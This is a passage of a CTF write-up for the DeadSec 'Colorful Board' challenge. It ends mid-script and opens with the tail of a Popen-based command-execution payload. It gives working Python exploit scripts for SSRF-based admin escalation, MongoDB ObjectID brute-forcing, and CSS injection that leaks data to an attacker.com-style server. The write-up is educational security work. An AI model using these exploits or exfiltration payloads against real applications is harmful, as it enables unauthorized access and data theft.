class="nx">item</span><span class="p">.</span><span class="nx">__name__</span><span class="o">!=</span><span class="dl">'</span><span class="s1">type</span><span class="dl">'</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">result</span><span class="o">=</span><span class="nf">findpopen</span><span class="p">(</span><span class="nx">item</span><span class="p">))){</span> <span class="k">return</span> <span class="nx">result</span> <span class="p">}</span> <span class="p">}};</span><span class="nx">n11</span> <span class="o">=</span> <span class="nf">findpopen</span><span class="p">(</span><span class="nx">obj</span><span class="p">)(</span><span class="nx">cmd</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nf">communicate</span><span class="p">()</span>
</code></pre></div></div>

<p>That was weird but fun!</p>

<h2 id="colorful-board">Colorful Board</h2>

<ul>
  <li>Difficulty: Medium</li>
</ul>

<p><img src="/assets/images/deadsec-writeups/colorful-board.png" alt="Colorful Board" /></p>

<p>We are finally there, I liked this challenge so much and was so exicted to make a writeup for it.
This challenge is <em>another</em> source analysis, we have a nestjs application with mongodb (exicting right?) I will analyze and discuss the interesting parts of the code and the controls that we have briefly to you later understand how I crafted the exploit or how I thought about it.</p>

<p>We have four controllersas follow:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">auth.controller.ts</code> which is responsible for the authentication and the login and registeration, it has the following endpoints:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /auth/register</code></li>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /auth/login</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">post.controller.ts</code> which is responsible for the posts management, view/edit/write, it has the following endpoints:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">GET /post</code></li>
      <li><code class="language-plaintext highlighter-rouge">GET /post/all</code></li>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /post/write</code></li>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /post/edit/:id</code> - Only Admin</li>
      <li><code class="language-plaintext highlighter-rouge">GET/POST /post/:id</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">admin.controller.ts</code> which is responsible for the admin functions, it has the following endpoints:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">GET /admin/grant?username</code> Only localhost access</li>
      <li><code class="language-plaintext highlighter-rouge">GET /admin/notice</code> Only Admin</li>
      <li><code class="language-plaintext highlighter-rouge">GET /admin/report</code> - Anyone logged in (doesn‚Äôt have to be admin)</li>
      <li><code class="language-plaintext highlighter-rouge">GET /admin/notice/:id</code> - Only Admin</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">user.controller.ts</code> which is responsible for the user profile and the user data, it has no endpoints just utilities used across the app</li>
</ul>

<p>Those are the endpoints with functionalities, we will dive in details in what we needs when times come.</p>

<p>Now before we start diving into exploiting it, we need to answer few questions, where is the flag? what else is running in the application?</p>

<p>Looking at the sources files we have <code class="language-plaintext highlighter-rouge">init-data.js</code></p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ...</span>
<span class="kd">const</span> <span class="nx">init_db</span> <span class="o">=</span> <span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nf">insertMany</span><span class="p">([</span>
        <span class="p">{</span> <span class="na">username</span><span class="p">:</span> <span class="dl">"</span><span class="s2">DEAD{THIS_IS_</span><span class="dl">"</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="dl">"</span><span class="s2">dummy</span><span class="dl">"</span><span class="p">,</span> <span class="na">personalColor</span><span class="p">:</span> <span class="dl">"</span><span class="s2">#000000</span><span class="dl">"</span><span class="p">,</span> <span class="na">isAdmin</span><span class="p">:</span> <span class="kc">true</span> <span class="p">},</span>
    <span class="p">]);</span>
    <span class="k">await</span> <span class="nf">delay</span><span class="p">(</span><span class="nf">randomDelay</span><span class="p">());</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">notices</span><span class="p">.</span><span class="nf">insertOne</span><span class="p">({</span> <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">asdf</span><span class="dl">"</span><span class="p">,</span> <span class="na">content</span><span class="p">:</span> <span class="dl">"</span><span class="s2">asdf</span><span class="dl">"</span> <span class="p">});</span>
    <span class="k">await</span> <span class="nf">delay</span><span class="p">(</span><span class="nf">randomDelay</span><span class="p">());</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">notices</span><span class="p">.</span><span class="nf">insertOne</span><span class="p">({</span> <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">,</span> <span class="na">content</span><span class="p">:</span> <span class="dl">"</span><span class="s2">FAKE_FLAG}</span><span class="dl">"</span> <span class="p">});</span>
    <span class="k">await</span> <span class="nf">delay</span><span class="p">(</span><span class="nf">randomDelay</span><span class="p">());</span>
    <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">notices</span><span class="p">.</span><span class="nf">insertOne</span><span class="p">({</span> <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">qwer</span><span class="dl">"</span><span class="p">,</span> <span class="na">content</span><span class="p">:</span> <span class="dl">"</span><span class="s2">qwer</span><span class="dl">"</span> <span class="p">});</span>
<span class="p">}</span>
<span class="nf">init_db</span><span class="p">();</span>
<span class="c1">// ..</span>
</code></pre></div></div>

<p>Interesting, part of the flag is part of the admin‚Äôs username and the other part is part of the notices, moreover there is no way in the application to expose someone‚Äôs username if he didn‚Äôt post anything, and for the second part we need to know the notice id to access it, because the <code class="language-plaintext highlighter-rouge">GET /admin/notice/</code> doesn‚Äôt show the Notice ID if it includes ‚Äúflag‚Äù in the title, Finally we need to be an admin to access the notices.</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">@</span><span class="nd">Get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/notice</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">@</span><span class="nd">UseGuards</span><span class="p">(</span><span class="nx">AdminGuard</span><span class="p">)</span> <span class="c1">// Only Admin</span>
    <span class="p">@</span><span class="nd">Render</span><span class="p">(</span><span class="dl">'</span><span class="s1">notice-main</span><span class="dl">'</span><span class="p">)</span>
    <span class="k">async</span> <span class="nf">renderAllNotice</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">notices</span> <span class="o">=</span> <span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">adminService</span><span class="p">.</span><span class="nf">getAllNotice</span><span class="p">();</span>
        <span class="k">return</span> <span class="p">{</span> <span class="na">notices</span><span class="p">:</span> <span class="nx">notices</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nx">notice</span> <span class="o">=&gt;</span> <span class="o">!</span><span class="nx">notice</span><span class="p">.</span><span class="nx">title</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">))</span> <span class="p">};</span> <span class="c1">// Fun!</span>
    <span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Becoming Admin</li>
</ul>

<p>A lot of work to do, let‚Äôs split the steps first thing first, we need to be an admin, after spending hours in the code looking for what could work and what couldn‚Äôt, we can call the <code class="language-plaintext highlighter-rouge">GET /admin/grant?username</code> through the <code class="language-plaintext highlighter-rouge">GET /admin/report</code> endpoin because it has no restrictions or filters.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  Colorful-Board curl <span class="s1">'https://eb7655042aed5ebaba63a259.deadsec.quest/admin/report?url=http://127.0.0.1:1337/admin/grant?username=oz'</span> <span class="nt">-H</span> <span class="s2">"Cookie: </span><span class="nv">$cookie</span><span class="s2">"</span>
<span class="o">{</span><span class="s2">"status"</span>:200,<span class="s2">"message"</span>:<span class="s2">"Reported."</span><span class="o">}</span>
</code></pre></div></div>

<p>We relogin and now are Admin!</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  sample-colorful_board curl <span class="s1">'https://eb7655042aed5ebaba63a259.deadsec.quest/admin/notice'</span> <span class="nt">-H</span> <span class="s2">"Cookie: </span><span class="nv">$cookie</span><span class="s2">"</span>
&lt;<span class="o">!</span>DOCTYPE html&gt;
&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"ko"</span><span class="o">&gt;</span>
<span class="c"># ..</span>
<span class="c"># ..</span>
</code></pre></div></div>

<ul>
  <li>Getting the second part of the flag</li>
</ul>

<p>Now we can see the notices but not the one that has the flag, we will skip the first part for now and focus on the second part you will see why later (it‚Äôs easier üòÖ).</p>

<p>We have two notices IDs and the flag is inbetween them</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h2&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/admin/notice/66a67f8a5abd7894b69f2d68"</span><span class="nt">&gt;</span>asdf<span class="nt">&lt;/a&gt;&lt;/h2&gt;</span>
<span class="nt">&lt;h2&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/admin/notice/66a67f905abd7894b69f2d6a"</span><span class="nt">&gt;</span>qwer<span class="nt">&lt;/a&gt;&lt;/h2&gt;</span>
</code></pre></div></div>
<p>If you notice the IDs are similar, only minor and predictable because of how mongodb ObjectID works. During the CTF my script was trying all possible iterations on the differencet characters because somehow the difference was only 2 characters which is a small charset to bruteforce. Now it‚Äôs 3 so it‚Äôs not efficient I had to find another way to predict that and it‚Äôs when I found this <a href="https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb#mongo-objectid-predict">hacktricks</a> page.
This gives a better idea on how we should predict the id, <code class="language-plaintext highlighter-rouge">66a67f8a5abd7894b69f2d68</code> is the first and <code class="language-plaintext highlighter-rouge">66a67f905abd7894b69f2d6a</code> is the third, the last char differ by 2 i.e in the middle our flag notice id will end with 9, left two more chars which just need to be bruteforced.</p>

<p>If we look at the IDs in our local image it will look like this which will comfirm that which is also detailed in the article linked above.</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">cb&gt;</span><span class="w"> </span><span class="err">db.notices.find()</span><span class="w">
</span><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="err">_id:</span><span class="w"> </span><span class="err">ObjectId('</span><span class="mi">66</span><span class="err">a</span><span class="mi">66e63387296</span><span class="err">b</span><span class="mi">1</span><span class="err">ad</span><span class="mi">9</span><span class="err">f</span><span class="mi">2</span><span class="err">d</span><span class="mi">68</span><span class="err">')</span><span class="p">,</span><span class="w">
    </span><span class="err">title:</span><span class="w"> </span><span class="err">'asdf'</span><span class="p">,</span><span class="w">
    </span><span class="err">content:</span><span class="w"> </span><span class="err">'asdf'</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="err">_id:</span><span class="w"> </span><span class="err">ObjectId('</span><span class="mi">66</span><span class="err">a</span><span class="mi">66e68387296</span><span class="err">b</span><span class="mi">1</span><span class="err">ad</span><span class="mi">9</span><span class="err">f</span><span class="mi">2</span><span class="err">d</span><span class="mi">69</span><span class="err">')</span><span class="p">,</span><span class="w">
    </span><span class="err">title:</span><span class="w"> </span><span class="err">'flag'</span><span class="p">,</span><span class="w">
    </span><span class="err">content:</span><span class="w"> </span><span class="err">'FAKE_FLAG</span><span class="p">}</span><span class="err">'</span><span class="w">
  </span><span class="err">}</span><span class="p">,</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="err">_id:</span><span class="w"> </span><span class="err">ObjectId('</span><span class="mi">66</span><span class="err">a</span><span class="mi">66e6</span><span class="err">c</span><span class="mi">387296</span><span class="err">b</span><span class="mi">1</span><span class="err">ad</span><span class="mi">9</span><span class="err">f</span><span class="mi">2</span><span class="err">d</span><span class="mi">6</span><span class="err">a')</span><span class="p">,</span><span class="w">
    </span><span class="err">title:</span><span class="w"> </span><span class="err">'qwer'</span><span class="p">,</span><span class="w">
    </span><span class="err">content:</span><span class="w"> </span><span class="err">'qwer'</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>
<p>And here is the final script to automate everything we done so far and get the second part of the flag.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">threading</span>

<span class="c1"># url = "http://127.0.0.1:1337/"
</span><span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://eb7655042aed5ebaba63a259.deadsec.quest/</span><span class="sh">"</span>
<span class="n">creds</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">oz</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">oz</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">personalColor</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">blue</span><span class="sh">"</span><span class="p">}</span>
<span class="n">access_token</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">flag_id</span> <span class="o">=</span> <span class="sh">""</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>

<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/register</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">creds</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">creds</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">])</span>

<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span>
    <span class="n">url</span>
    <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin/report?url=http://localhost:1337/admin/grant?username=</span><span class="si">{</span><span class="n">creds</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
<span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">clear</span><span class="p">()</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">creds</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">])</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">admin/notice</span><span class="sh">"</span><span class="p">)</span>
<span class="n">ids</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">notice/([a-f0-9]+)</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">ids</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_id</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">s</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin/notice/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">get_id</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span>


<span class="k">def</span> <span class="nf">process_id</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="nf">get_id</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>
    <span class="k">if</span> <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>
    <span class="nf">print</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>


<span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">max_threads</span> <span class="o">=</span> <span class="mi">50</span>

<span class="k">for</span> <span class="n">b1</span><span class="p">,</span> <span class="n">b2</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">ids</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ids</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
    <span class="k">if</span> <span class="n">b1</span> <span class="o">==</span> <span class="n">b2</span><span class="p">:</span>
        <span class="n">flag_id</span> <span class="o">+=</span> <span class="n">b1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">flag_id</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">#</span><span class="sh">"</span>
<span class="n">flag_id</span> <span class="o">=</span> <span class="n">flag_id</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s">9</span><span class="sh">"</span>  <span class="c1"># last char is always 9
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">):</span>  <span class="c1"># we could use itertools.product but it's not necessary
</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">flag_id</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">##</span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">process_id</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="nb">id</span><span class="p">,))</span>
    <span class="n">threads</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
    <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">threads</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">max_threads</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
            <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
        <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
    <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

</code></pre></div></div>

<p>And we got the first part!</p>

<p><img src="/assets/images/deadsec-writeups/colorful-board-01.png" alt="Colorful Board" /></p>

<ul>
  <li>Getting the first part of the flag</li>
</ul>

<p>Now to get the first part I spent some hours looking around, until I thought that the challenge name should mean something especially that when we do register we can specify a color to have for our user account which is used in some places in the application.</p>

<p><img src="/assets/images/deadsec-writeups/colorful-board-02.png" alt="Colorful Board" /></p>

<p>How is that relevant? We can use this to inject some CSS/XSS(doesn‚Äôt work) to leak the admin‚Äôs page or some of it‚Äôs content when doing report. Now let‚Äôs skip the XSS though I spent most of the time trying to make it work, but on the website nothing reflects and outside the website we can‚Äôt access it‚Äôs content or do CSRF because of the same-origin policy.</p>

<p>So now we have <a href="https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection">CSS injection</a> we need a good page to leak the flag from, the <code class="language-plaintext highlighter-rouge">/post/edit/:id</code> which the admin can access has what we need</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>common/views/post-edit.hbs:            color: <span class="o">}</span>
</code></pre></div></div>
<p><img src="/assets/images/deadsec-writeups/colorful-board-03.png" alt="Colorful Board" /></p>

<p>Now from the hacktricks we know we can leak chars from the page by using the <code class="language-plaintext highlighter-rouge">background-image</code> like this for example:</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">input</span><span class="o">[</span><span class="nt">class</span><span class="o">=</span><span class="nt">user</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"D"</span><span class="o">]</span> <span class="p">{</span>
    <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url("http://attacker.com/flag/D")</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>If the flag starts with <code class="language-plaintext highlighter-rouge">D</code> we will get a request to <code class="language-plaintext highlighter-rouge">http://attacker.com/flag/D</code> and so on for the rest of the flag.</p>

<p>Now all we need is a script to generate accounts with different colors chars to see what the flag looks like, I have seen many solves and all of them were semi-automated because of how this whole thing is. So here is a little different approach üôÇ</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">flask</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">digits</span><span class="p">,</span> <span class="n">ascii_letters</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">from</span> <span class="n">requests.adapters</span> <span class="kn">import</span> <span class="n">HTTPAdapter</span><span class="p">,</span> <span class="n">Retry</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://eb7655042aed5ebaba63a259.deadsec.quest/</span><span class="sh">"</span>
<span class="n">server</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://REDACTED/</span><span class="sh">"</span>
<span class="n">charset</span> <span class="o">=</span> <span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">digits</span> <span class="o">+</span> <span class="sh">"</span><span class="s">_{}-</span><span class="sh">"</span><span class="n">flag</span> <span class="o">=</span> <span class="sh">"</span><span class="s">DEAD{</span><span class="sh">"</span>

<span class="n">max_threads</span> <span class="o">=</span> <span class="mi">5</span>


<span class="k">def</span> <span class="nf">check_flag</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">ozs</span><span class="si">{</span><span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">oz</span><span class="sh">"</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">payload</span><span class="p">[</span><span class="sh">"</span><span class="s">personalColor</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">blue;</span><span class="sh">"</span>
        <span class="o">+</span> <span class="sh">"</span><span class="s">}</span><span class="sh">"</span>
        <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">input[class=</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="s">][value^=</span><span class="sh">'</span><span class="si">{</span><span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="s">]</span><span class="sh">"</span>
        <span class="o">+</span> <span class="sh">"</span><span class="s">{</span><span class="sh">"</span>
        <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">background-image: url(</span><span class="sh">'</span><span class="si">{</span><span class="n">server</span><span class="si">}</span><span class="s">oz/</span><span class="si">{</span><span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>
    <span class="p">)</span>
    <span class="n">payload</span><span class="p">[</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ozs</span><span class="sh">"</span> <span class="o">+</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">i</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
    <span class="n">retries</span> <span class="o">=</span> <span class="nc">Retry</span><span class="p">(</span>
        <span class="n">total</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">backoff_factor</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">status_forcelist</span><span class="o">=</span><span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="mi">600</span><span class="p">)]</span>
    <span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">mount</span><span class="p">(</span><span class="sh">"</span><span class="s">http://</span><span class="sh">"</span><span class="p">,</span> <span class="nc">HTTPAdapter</span><span class="p">(</span><span class="n">max_retries</span><span class="o">=</span><span class="n">retries</span><span class="p">))</span>

    <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/register</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">])</span>

    <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">post/write</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">title</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">})</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">post/</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">post_id</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">post/([a-f0-9]+)</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">post_id</span><span class="p">,</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
